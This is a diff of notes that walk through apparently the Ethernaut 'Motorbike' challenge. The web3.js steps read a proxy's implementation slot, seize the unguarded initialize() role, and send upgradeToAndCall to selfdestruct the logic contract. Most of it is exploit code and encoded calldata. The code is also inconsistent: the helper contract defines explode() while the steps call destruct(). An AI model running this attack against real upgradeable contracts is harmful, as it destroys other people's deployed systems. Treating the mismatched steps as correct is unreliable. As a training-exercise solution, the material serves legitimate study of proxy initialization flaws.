@@ -1,8 +1,67 @@
 Logic flow:-
-  -> We need to gain to Engine
-      -> We'll the address from the constent slot location
-  -> We'll want to call "initialize" to make our player the "upgrader"
-  -> We can now upgrade the implementation via "upgradeToAndCall", so lets create a selfDistruct contract
-  -> Once the selfDistruct contract created, It's time to setup the "upgradeToAndCall" to call our selfDistruct contract > then call
+  1-> We need to gain to Engine
+    => implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
+    // Output: '0x000000000000000000000000<20-byte-implementation-contract-address>'
+    Ex:- "0x000000000000000000000000fa2950c365e0c397dd0aa05137d8270522c0c470" 
+      This yields a 32 byte value (each slot is 32 byte). Remove padding of 0s to get 20 byte address:
+      1.1-> We'll the address from the constent slot location
+      => implAddr = '0x' + implAddr.slice(-40)
+      // Output: '0x<20-byte-implementation-contract-address>'
+      Ex:- 0xfa2950c365e0c397dd0aa05137d8270522c0c470
 
-implAddr = await web3.eth.getStorageAt(contract.address, '')
+  2-> We'll want to call "initialize" to make our player the "upgrader"
+    => initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
+    // output: "0x8129fc1c" 
+    => await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData }) 
+    Alright, invoking initialize method must've now set player as upgrader. Verify by:
+    => upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
+    we called upgrader() because in Engine contract upgrader is set msg.sender while initialize()
+
+    => await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) ===           player.toLowerCase()
+    // Output: true
+    So, player is now eligible to upgrade the implementation contract now through upgradeToAndCall method
+
+  -> We can now upgrade the implementation via "upgradeToAndCall", so lets create a selfDistruct contract
+    selfDestruct contract:-
+    // SPDX-License-Identifier: MIT
+    pragma solidity <0.7.0;
+    
+    contract selfDestruct {
+        function explode() public {
+            selfdestruct(address(0));
+        }
+    }
+
+  -> Once the selfDistruct contract created, It's time to setup the "upgradeToAndCall" to call our selfDistruct contract > then call
+      destructAdd = "0x9294458771A2877CbC59026055285B3f5AA3BA50" 
+      destructData = web3.eth.abi.encodeFunctionSignature("destruct()")
+      //output:- "0x2b68b9c6" 
+      Add destructAdd and destructData in an array
+      upgradeParams = [destructAdd, destructData]
+
+      
+      upgradeSignature = {
+          name: 'upgradeToAndCall',
+          type: 'function',
+          inputs: [
+              {
+                  type: 'address',
+                  name: 'newImplementation'
+              },
+              {
+                  type: 'bytes',
+                  name: 'data'
+              }
+          ]
+      }
+
+      upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
+      //output:- "0x4f1ef2860000000000000000000000009294458771a2877cbc59026055285b3f5aa3ba50000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000042b68b9c600000000000000000000000000000000000000000000000000000000"
+      Its concatinate all data togather
+
+await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData}) 
+
+
+:Tada::Boom: The Engine is destroyed! The Motorbike is now useless. Motorbike cannot even be repaired now because all the upgrade logic was in the logic contract which is now destroyed.
+
+
